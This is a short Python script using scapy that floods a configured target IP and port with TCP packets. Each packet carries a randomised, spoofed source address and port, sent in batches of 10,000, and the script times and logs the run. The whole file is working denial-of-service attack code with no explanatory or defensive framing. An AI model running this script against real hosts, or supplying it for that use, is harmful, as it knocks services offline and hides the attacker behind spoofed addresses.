

from scapy.all import *
from scapy.layers.inet import IP, TCP

import CONST
import randomIP
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s'
)

ATTACK_IP_ADDRESS = CONST.IP_ADDRESS
ATTACK_PORT = CONST.DST_PORT


def reset_packet(packet):
    ip_packet = packet[IP]
    tcp_packet = packet[TCP]

    ip_packet.src = randomIP.IPV4()
    tcp_packet.sport = randomIP.PORT()

    return ip_packet / tcp_packet


def flood_attack(destination, dport, count: int):
    packet = IP(src=randomIP.IPV4(), dst=destination) / TCP(sport=randomIP.PORT(), dport=dport)
    new_count = count
    outer_loop_time = count // 10000
    if outer_loop_time * 10000 != count:
        new_count = min(outer_loop_time * 10000, count)
    if new_count == 0:
        send(
            [reset_packet(packet=packet) for _ in range(count)]
        )
    else:
        for _ in range(outer_loop_time):
            send(
                [reset_packet(packet=packet) for _ in range(10000)]
            )


if __name__ == '__main__':
    number = pow(10, 4)
    start_time = time.time()
    flood_attack(destination=ATTACK_IP_ADDRESS, dport=ATTACK_PORT, count=number)
    cost_time = time.time() - start_time
    logging.info(
        msg=f'SENT {number} PACKETS. EACH PACKET COST {cost_time / number}. SUM TIME = <{cost_time}>'
    )
